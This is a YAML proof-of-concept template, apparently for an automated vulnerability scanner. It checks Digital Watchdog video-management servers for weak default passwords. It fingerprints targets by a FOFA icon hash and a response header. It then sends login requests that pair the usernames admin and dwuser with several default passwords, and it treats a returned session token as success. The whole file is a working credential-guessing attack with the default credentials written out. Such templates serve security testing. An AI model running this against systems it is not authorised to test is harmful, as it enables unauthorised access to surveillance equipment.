id: poc-yaml-digital-watchdog-weak-password
info:
  name: Digital Watchdog 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: digital_watchdog
  fofa: icon_hash="868509217"
variables:
  user: 'admin

    dwuser

    '
  pass: 'admin

    admin1234

    admin12345

    Dw5pectrum

    '
firstRequest:
  method: GET
  path: /static/index.html
  expression: contains(headers,"Digital Watchdog")
requests:
- method: POST
  path: /web/rest/v1/login/sessions
  headers:
    Content-Type: application/json
  data: '{"username":"{{.user}}","password":"{{.pass}}","setCookie":true}'
  expression: status_code == 200 && contains(headers,"x-runtime-guid=") && matches(body,"\"token\":\"([0-9a-zA-Z-]+)\"")
    && contains(body,"username") && !contains(body,"<") && contains(content_type,"application/json")
transport: http
